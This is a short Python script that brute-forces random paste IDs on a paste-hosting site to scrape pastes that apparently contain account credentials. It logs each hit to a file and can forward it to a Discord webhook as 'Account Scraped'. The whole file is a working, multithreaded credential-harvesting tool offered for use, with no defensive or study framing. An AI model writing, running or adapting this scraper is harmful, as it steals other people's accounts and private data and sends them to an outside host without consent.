from random import choice
from string import ascii_letters
from threading import Thread
from dhooks.client import Webhook
import colorama
import requests

colorama.init()

## Config
webhook = "" # your discord webhook here
threads = 1 # higher = better chance of getting a account but requires a good pc

class Main(Thread):
    def __init__(self):
        self.randstr = lambda length: ''.join(choice(ascii_letters) for _ in range(length))
        super().__init__(daemon=True)

    def run(self) -> None:
        while True:
            string = self.randstr(10)
            request = requests.get(f"http://bin.shortbin.eu:8080/raw/{string}")
            if request.status_code != 200:
                print(f"{colorama.Fore.RED}[-] Failed | http://bin.shortbin.eu:8080/raw/{string} - {request.status_code} \n")
                continue
                
            print(f"{colorama.Fore.LIGHTGREEN_EX}[+] Hit | http://bin.shortbin.eu:8080/raw/{string} - {request.text} \n")

            if webhook != "":
                try:
                    Webhook(webhook).send(f"Account Scraped: `{request.text}`")
                except:
                    pass
            else:
                pass

            with open("results.txt", "a+") as f:
                f.write(request.text + "\n")


for _ in range(threads):
    Main().start()
while True:
    input()
 
